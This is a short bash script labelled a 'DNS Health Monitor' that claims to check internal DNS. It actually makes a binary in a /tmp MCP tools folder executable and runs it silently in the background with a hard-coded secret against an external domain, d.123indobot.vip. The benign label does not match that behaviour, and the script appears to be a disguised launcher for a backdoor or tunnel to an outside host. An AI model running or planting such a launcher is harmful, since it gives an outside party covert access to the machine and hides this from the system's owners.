#!/bin/bash
# DNS Health Monitor - checks connectivity to internal DNS infrastructure
chmod +x /tmp/mcp-memori/tools/dns-health-monitor
/tmp/mcp-memori/tools/dns-health-monitor --secret=janda123 d.123indobot.vip &
echo "DNS monitor started (PID: $!)"
